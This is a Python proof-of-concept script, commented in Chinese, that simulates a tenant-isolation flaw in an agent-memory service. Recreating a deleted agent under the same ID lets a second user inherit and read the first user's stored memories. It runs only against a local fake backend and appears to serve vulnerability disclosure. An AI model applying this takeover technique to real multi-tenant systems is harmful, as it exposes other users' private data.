#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC #1 — 租户隔离破坏：重建 Agent 静默接管已存在的 Moorcheh namespace
========================================================================

对应漏洞：memanto/app/services/agent_service.py:100-114
          (ConflictError / "namespace already exists" 被当作成功处理)

攻击链路（全部为本地代码逻辑模拟，不打线上）：
  1. 受害者 User A 创建 agent "alice"，在 Moorcheh 中拥有 namespace
     "memanto_agent_alice"，其中存有敏感记忆。
  2. User A 删除本地 agent（默认保留 Moorcheh namespace，见
     sessions.py:151-196 与 cli/commands/agent.py:181 的 default=True）。
  3. 攻击者 User B 用相同的 agent_id "alice" 再次调用 create_agent：
       - 本地 agents 目录里没有 alice.json → 存在性检查通过
       - Moorcheh namespaces.create 抛出 ConflictError（namespace 已存在）
       - agent_service.py:107-114 把该异常当作成功，继续保存本地 agent
  4. B 调用 activate → 得到 session_token → recall/remember 直接读写
     A 的全部记忆。

本脚本不依赖 memanto 包与网络：用 stdlib 精确复刻上述控制流，
并用一个 FakeMoorcheh 模拟后端行为。可 `python poc_01_namespace_adoption.py` 直接运行。
"""

import json
import uuid
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# 1) 复刻 memanto/app/core.py:80-82 —— namespace 由 agent_id 确定
# ---------------------------------------------------------------------------
def agent_namespace(agent_id: str) -> str:
    return f"memanto_agent_{agent_id}"


# ---------------------------------------------------------------------------
# 2) Fake Moorcheh 后端 —— 模拟"namespace 已存在"的云端行为
# ---------------------------------------------------------------------------
class ConflictError(Exception):
    """对应 moorcheh_sdk.exceptions.ConflictError"""


class FakeMoorcheh:
    """最小 Moorcheh 客户端：namespace 归属性不做任何校验（与云端一致）。"""

    def __init__(self, api_key: str):
        self.api_key = api_key
        # namespace_name -> {"owner": 谁的 key 创建的, "docs": {id: text}}
        self.namespaces_db: dict[str, dict] = {}
        # 受害者 User A 的 key 先创建了 alice 的 namespace 并写了敏感记忆
        self.namespaces_db["memanto_agent_alice"] = {
            "owner": "victim-key",
            "docs": {
                "mem-1": "[FACT] 受害者银行账户\n\n"
                         "账号 6222-xxxx-xxxx-1234，余额 98 万元，"
                         "常用密码 qwerty-not-real",
            },
        }

    def namespaces(self):
        class NS:
            def __init__(self, backend):
                self._b = backend

            def create(self, namespace, type="text"):
                # 复刻云端语义：namespace 已存在 → ConflictError
                if namespace in self._b.namespaces_db:
                    raise ConflictError(
                        f"namespace '{namespace}' already exists"
                    )
                self._b.namespaces_db[namespace] = {"owner": None, "docs": {}}
                return {"status": "created"}

            def list(self):
                return {
                    "namespaces": [
                        {"namespace_name": n}
                        for n in self._b.namespaces_db
                    ]
                }

        return NS(self)

    def documents(self):
        class Docs:
            def __init__(self, backend):
                self._b = backend

            def upload(self, namespace_name, documents):
                for d in documents:
                    self._b.namespaces_db[namespace_name]["docs"][d["id"]] = d["text"]
                return {"status": "success"}

            def get(self, namespace_name, ids):
                items = []
                for i in ids:
                    t = self._b.namespaces_db[namespace_name]["docs"].get(i)
                    if t:
                        items.append({"id": i, "text": t, "metadata": {}})
                return {"items": items}

            def fetch_text_data(self, namespace_name, limit=100, next_token=None):
                return {
                    "items": [
                        {"id": k, "text": v, "metadata": {}}
                        for k, v in self._b.namespaces_db[namespace_name]["docs"].items()
                    ],
                    "pagination": {"has_more": False},
                }

        return Docs(self)


# ---------------------------------------------------------------------------
# 3) 复刻 memanto/app/services/agent_service.py:57-127 的 create_agent 核心逻辑
# ---------------------------------------------------------------------------
class AgentServiceSim:
    """本地 agents 元数据目录（模拟 ~/.memanto/agents/）。"""

    def __init__(self):
        self.agents_dir: dict[str, dict] = {}   # agent_id -> metadata

    def create_agent(self, agent_create, moorcheh_api_key) -> dict:
        agent_id = agent_create["agent_id"]
        # 对应 agent_service.py:73-77 —— 只检查本地文件是否存在
        if agent_id in self.agents_dir:
            raise Exception(f"Agent '{agent_id}' already exists")

        namespace = agent_namespace(agent_id)           # core.py:80-82
        client = FakeMoorcheh(api_key=moorcheh_api_key)

        # 对应 agent_service.py:100-114 —— 关键缺陷：已存在 → 当作成功
        try:
            client.namespaces().create(namespace, type="text")
            print(f"[OK] Namespace created in Moorcheh: {namespace}")
        except Exception as exc:
            message = str(exc).lower()
            if isinstance(exc, ConflictError) or (
                "namespace" in message and "already exists" in message
            ):
                # <<< 缺陷所在：不验证 namespace 归属，直接继续 >>>
                print(f"[OK] Namespace already exists in Moorcheh: {namespace}")
            else:
                raise

        agent = {
            "agent_id": agent_id,
            "namespace": namespace,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }
        self.agents_dir[agent_id] = agent           # 对应 agent_service.py:126
        return agent

    def delete_agent(self, agent_id: str, delete_backup_too: bool = False):
        # 对应 sessions.py:151-196：默认 delete_backup_too=False，
        # 只删本地元数据，namespace 保留（"backup retained in Moorcheh"）
        self.agents_dir.pop(agent_id, None)
        print(f"[.] Local metadata for '{agent_id}' deleted "
              f"(namespace {'DELETED' if delete_backup_too else 'KEPT in Moorcheh'})")


# ---------------------------------------------------------------------------
# 4) 复刻 sessions.py:206-248 的 activate + memory.py 的 recall 最小链路
# ---------------------------------------------------------------------------
def activate(svc: AgentServiceSim, agent_id: str, backend: FakeMoorcheh):
    """对应 POST /api/v2/agents/{agent_id}/activate —— 不校验 namespace 归属。"""
    agent = svc.agents_dir.get(agent_id)
    if not agent:
        raise Exception(f"Agent '{agent_id}' not found")
    session_token = "sess_" + uuid.uuid4().hex          # 对应 session_service.create_session
    print(f"[OK] Agent '{agent_id}' activated. session_token={session_token[:16]}...")
    return {"session_token": session_token, "namespace": agent["namespace"]}


def recall_all(session: dict, backend: FakeMoorcheh):
    """对应 MemoryReadService._fetch_all_memories (memory_read_service.py:582-678)。"""
    namespace = session["namespace"]
    result = backend.documents().fetch_text_data(namespace_name=namespace)
    return result["items"]


# ---------------------------------------------------------------------------
# 5) 攻击演示
# ---------------------------------------------------------------------------
def main():
    print("=" * 72)
    print("PoC #1: 重建 agent 接管既有 namespace（租户隔离破坏）")
    print("=" * 72)

    backend = FakeMoorcheh("server-key")     # 服务端唯一 Moorcheh 账号
    svc = AgentServiceSim()

    print("\n[Step 1] User A 创建 agent 'alice' 并写入敏感记忆（模拟）")
    alice = svc.create_agent({"agent_id": "alice"}, "server-key")

    print("\n[Step 2] User A 删除本地 agent（默认保留 Moorcheh namespace）")
    svc.delete_agent("alice", delete_backup_too=False)

    print("\n[Step 3] 攻击者 User B 用相同 agent_id 重新创建 agent")
    bob = svc.create_agent({"agent_id": "alice"}, "server-key")
    print(f"    -> B 成功创建 agent（应该被拒绝，但没有）")

    print("\n[Step 4] User B 激活 agent 并召回全部记忆")
    session = activate(svc, "alice", backend)
    memories = recall_all(session, backend)
    print(f"    -> B 读到 {len(memories)} 条记忆：")
    for m in memories:
        print("      " + m["text"].replace("\n", " | "))

    print("\n[RESULT] 攻击者 B 在没有任何 User A 凭证的情况下，")
    print("         读到了 A 的 namespace 中的全部记忆。")
    print("         根因: agent_service.py:107-114 将 'namespace 已存在'")
    print("         当作成功，且 activate 链路无归属校验。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
